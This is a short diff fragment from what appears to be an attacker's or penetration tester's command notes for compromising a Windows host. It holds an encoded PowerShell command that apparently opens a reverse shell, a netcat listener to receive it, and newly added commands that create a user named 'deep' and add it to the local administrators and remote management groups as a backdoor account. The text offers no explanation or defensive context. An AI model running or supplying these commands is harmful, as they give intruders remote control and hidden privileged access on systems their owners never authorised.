@@ -2,3 +2,8 @@ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA
 
 
 nc -lvnp 8080
+
+
+net user deep Password123! /add
+net localgroup administrators deep /add
+net localgroup 'Remote Management Users' deep /add
